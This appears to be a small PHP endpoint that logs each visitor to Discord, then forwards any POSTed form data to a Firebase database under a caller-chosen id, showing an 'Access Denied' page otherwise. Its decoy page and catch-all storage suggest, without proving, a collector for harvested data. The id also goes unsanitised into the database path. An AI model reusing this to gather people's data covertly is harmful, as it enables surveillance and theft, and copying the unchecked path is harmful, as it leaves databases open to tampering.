<?php

include("discord.php");
$sendembed = New Discord();

//Executes the function
$sendembed->Visitor();

// Replace with your Firebase project ID, database URL, and secret API key
$projectId = 'PROJECT_ID';
$databaseUrl = 'FIREBASE_URL';
$apiKey = 'FIREBASE_API_KEY';

$data = $_POST;

// Check if the 'username' field is present
if (!isset($data['id'])) {
    echo '<!DOCTYPE html>
<html>
<head>
<!-- HTML Codes by Quackit.com -->
<title>
</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body {background-color:#ffffff;background-repeat:no-repeat;background-position:top left;background-attachment:fixed;}
h1{font-family:Arial, sans-serif;color:#000000;background-color:#ffffff;}
p {font-family:Georgia, serif;font-size:14px;font-style:normal;font-weight:normal;color:#ff0000;background-color:#ffffff;}
</style>
</head>
<body>
<h1></h1>
<p>Access Denied (Admin Only).</p>
</body>
</html>
';
    exit();
}

$username = $data['id'];

// Firebase Realtime Database endpoint
$endpoint = "$databaseUrl/received_data/$username.json?auth=$apiKey";

// Convert the data to JSON
$jsonData = json_encode($data);

// Set up the cURL request
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $endpoint);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'PATCH');
curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData);

// Execute the request
$response = curl_exec($ch);

// Check for errors
if (curl_errno($ch)) {
    echo 'Error adding data to the Firebase Realtime Database: ' . curl_error($ch);
} else {
    echo 'Data added successfully!';
}

// Close cURL resource
curl_close($ch);
?>
